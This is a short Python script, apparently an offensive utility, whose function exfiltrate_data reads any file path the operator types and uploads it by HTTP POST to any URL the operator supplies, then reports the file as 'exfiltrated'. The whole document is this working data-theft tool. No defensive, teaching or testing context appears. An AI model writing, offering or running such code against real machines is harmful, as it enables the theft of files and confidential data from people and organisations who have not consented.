import requests
import sys

def exfiltrate_data(file_path, url):
    try:
        with open(file_path, "rb") as f:
            requests.post(url, files={"file": f})
            print(f"Exfiltrated {file_path}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    file_path = input("Enter file path to exfiltrate: ")
    url = input("Enter URL to exfiltrate to: ")
    exfiltrate_data(file_path, url)

if __name__ == "__main__":
    main()
